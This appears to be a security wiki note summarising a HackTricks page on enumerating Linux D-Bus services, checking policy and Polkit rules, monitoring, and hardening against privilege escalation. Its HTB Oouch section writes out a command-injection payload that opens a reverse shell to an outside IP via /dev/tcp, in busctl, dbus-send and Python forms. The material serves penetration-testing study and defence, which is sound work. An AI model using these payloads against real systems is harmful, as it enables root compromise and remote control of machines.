---
title: "HackTricks: D-Bus Enumeration & Command Injection Privilege Escalation"
tags: [linux-hardening, privilege-escalation, dbus, ipc]
sources: [hacktricks-dbus-enumeration.md]
updated: 2026-05-01
---

# HackTricks: D-Bus Enumeration & Command Injection Privilege Escalation

Source: [hacktricks-dbus-enumeration.md](../../raw/hacktricks-dbus-enumeration.md)

## Key Takeaways

D-Bus is Linux IPC. The **system bus** carries privileged services (often running as root) that expose methods callable by lower-privilege users. If a root-owned service passes user-controlled input to `system()` without sanitization, it is a command injection escalation path. Authorization is controlled by **policy XML** + **Polkit** — not just by OS-level permissions.

Activatable services (not yet running) are equally important — they can be started on demand and may have weaker protections.

## Enumeration Workflow

### 1. List all services

```bash
busctl list
```

Services marked `(activatable)` are not running but can be triggered. Check their `Exec=` and `User=`:

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

### 2. Get service details

```bash
busctl status htb.oouch.Block    # PID, UID, capabilities of the service process
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
```

### 3. Introspect objects and methods

```bash
busctl tree htb.oouch.Block
busctl introspect htb.oouch.Block /htb/oouch/Block
```

### 4. Check policy + Polkit layers

```bash
# D-Bus XML policy (who can send/receive/own)
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=' \
  /etc/dbus-1/system.d /usr/share/dbus-1/system.d 2>/dev/null

# Polkit actions (default authorization)
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self' \
  /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

### 5. Probe methods (start with low-risk)

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 \
  org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanReboot
```

## Command Injection Example (HTB Oouch)

Service receives string parameter and passes it unsanitized to `iptables` via `system()`:

```bash
# busctl
busctl call htb.oouch.Block /htb/oouch/Block htb.oouch.Block Block \
  s ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"

# dbus-send
dbus-send --system --print-reply --dest=htb.oouch.Block \
  /htb/oouch/Block htb.oouch.Block.Block \
  string:';bash -c "bash -i >& /dev/tcp/10.10.14.44/9191 0>&1" #'

# Python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
block_iface.Block(";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #")
```

## Monitoring

```bash
sudo busctl monitor htb.oouch.Block
sudo busctl capture > system-bus.pcapng   # save for Wireshark
dbus-monitor "type=method_call"
```

## Automated Tools

- **dbusmap** (`@taviso`): walks every object path, maps to PID/UID, marks unprotected names with `!`
  ```bash
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
- **uptux.py** (`@initstring`): finds writable paths in systemd units + overly-permissive D-Bus policy files
  ```bash
  python3 uptux.py -n
  ```

## Notable CVEs

| Year | CVE            | Component              | Pattern                                                                                                 |
| ---- | -------------- | ---------------------- | ------------------------------------------------------------------------------------------------------- |
| 2024 | CVE-2024-45752 | logiops `logid`        | Root service exposes config/macro management; attacker loads arbitrary macro = code execution           |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` | Root proxy forwards calls without preserving caller security context; backends treat all calls as UID 0 |

Proxy/compatibility services are a distinct bug class: if they relay privileged calls, verify how caller UID reaches the backend.

## Hardening

```bash
# Find world-open send/receive policies
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^\"]*"' \
  /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```

- Require Polkit for dangerous methods with correct caller PID
- Scope services to dedicated Unix groups in XML policy
- Blue team: `busctl capture > /var/log/dbus_$(date +%F).pcapng` for anomaly detection

## Related

- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: Linux Privilege Escalation Checklist](hacktricks-privilege-escalation-checklist.md)
- [HackTricks](../entities/hacktricks.md)
